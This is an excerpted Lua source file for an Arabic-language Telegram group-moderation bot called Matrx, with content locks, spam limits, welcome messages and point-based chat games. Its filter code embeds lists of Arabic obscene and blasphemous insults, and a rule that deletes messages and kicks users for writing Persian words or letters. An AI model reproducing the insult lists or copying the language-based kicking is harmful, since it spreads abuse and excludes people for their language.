DevRio:setex(Matrx.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Matrx     --
...
DevRio:set(Matrx..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(Matrx..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(Matrx..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(Matrx..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(Matrx..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevRio:get(Matrx..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Matrx..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Matrx..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Matrx..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Matrx..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Matrx..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Matrx..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Matrx..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevRio:get(Matrx..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Matrx..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevRio:get(Matrx..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Matrx     --
--        Sticker         --
if not VipMem(msg) then
if DevRio:get(Matrx..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Matrx..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(Matrx..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• @username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@FZOFZ]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevRio:get(Matrx.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Matrx     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(Matrx..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Matrx,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Matrx) then 
if DevRio:sismember(Matrx..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevRio:get(Matrx.."Rio:Text:BotWelcome") then RioText = DevRio:get(Matrx.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevRio:get(Matrx.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(Matrx.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@FZOFZ]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source Matrx     --
--        Contact         --
...
if DevRio:get(Matrx..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Matrx     --
...
if DevRio:get(Matrx..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Matrx..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Matrx..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevRio:get(Matrx..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Matrx..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Matrx..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevRio:get(Matrx..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(Matrx..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(Matrx..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source Matrx     --
if DevRio:get(Matrx.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevRio:del(Matrx.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(Matrx.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevRio:get('MatrxTeam:'..Matrx.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('MatrxTeam:'..Matrx..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('MatrxTeam:'..Matrx.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('MatrxTeam:'..Matrx.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('MatrxTeam:'..Matrx..'id:user'..msg.chat_id_)  
DevRio:incrby(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevRio:del('MatrxTeam:'..Matrx..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('MatrxTeam:'..Matrx.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('MatrxTeam:'..Matrx..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('MatrxTeam:'..Matrx.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('MatrxTeam:'..Matrx.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('MatrxTeam:'..Matrx..'ids:user'..msg.chat_id_)  
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevRio:get(Matrx.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevRio:get(Matrx.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevRio:get(Matrx.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevRio:get(Matrx.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevRio:get(Matrx.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local Users = DevRio:smembers(Matrx..'Rio:Users') 
local BotName = (DevRio:get(Matrx.."Rio:NameBot") or 'ماتركس')
...
Constructors = DevRio:smembers(Matrx..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(Matrx..'Rio:Constructor:'..v)
...
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Matrx..'.json', '᥀︙يحتوي الملف على ↫ ⤈\n مجموعه '..#List..' \n مشترك '..#Users..' ' ,dl_cb, nil)
...
--     Source Matrx     --
if DevRio:get(Matrx.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevRio:get(Matrx.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Matrx.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevRio:get(Matrx..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevRio:del(Matrx..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(Matrx..'DevRio4'..msg.sender_user_id_)
...
DevRio:set(Matrx..'Rio:ChId',data.id_)
else
...
--     Source Matrx     --
if DevRio:get(Matrx.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevRio:del(Matrx.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevRio:del(Matrx.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(Matrx.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevRio:get(Matrx..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevRio:del(Matrx..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevRio:del(Matrx..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:NameBot', text)
return false 
end
--     Source Matrx     --
if msg.chat_id_ then
...
NameBot = (DevRio:get(Matrx..'Rio:NameBot') or 'ماتركس')
local MatrxTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevRio2 = math.random(#MatrxTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevRio:get(Matrx..'Rio:NameBot') or 'ماتركس') 
local MatrxTeam = {"اسمي القميل "..NameBot.." "} 
DevRio2 = math.random(#MatrxTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(Matrx..'Rio:NameBot') or 'ماتركس') then 
NameBot = (DevRio:get(Matrx..'Rio:NameBot') or 'ماتركس')
...
if tonumber((DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevRio:del(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source Matrx     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevRio:get(Matrx..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','??','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1,MatrxTeam, 1, 'md')
return false
end end
if text == DevRio:get(Matrx..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
MatrxTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,MatrxTeam, 1, 'md')
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Matrx..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
if not DevRio:get(Matrx..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(Matrx.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevRio:setex(Matrx.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevRio2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
if text == DevRio:get(Matrx..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Matrx..'Rio:GameNum5'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Matrx..'Rio:GameNum6'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Matrx..'Rio:GameNum7'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Matrx..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(Matrx..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Matrx..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(Matrx..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Matrx..'Rio:GameNum8'..msg.chat_id_)
...
--     Source Matrx     --
if DevRio:get(Matrx.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(Matrx.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Matrx.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Matrx.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevRio:get(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevRio:get(Matrx..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevRio:set(Matrx.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevRio:setex(Matrx.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Matrx     --
...
if not DevRio:get(Matrx..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(Matrx.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(Matrx..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(Matrx.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(Matrx.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevRio:set(Matrx.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevRio:del(Matrx.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(Matrx.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(Matrx..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevRio:sadd(Matrx..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(Matrx.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(Matrx..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(Matrx.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(Matrx.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
Text = ''..MatrxTeam[math.random(#MatrxTeam)]..''
keyboard = {} 
keyboard.inline_keyboard = {{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح رسائلي •",callback_data="/DelMsg:"..msg.sender_user_id_},{text="• مسح سحكاتي •",callback_data="/DelEdit:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
local Tsl = DevRio:get(Matrx..'Rio:Tsl')
local Text = [[
...
keyboard = {} 
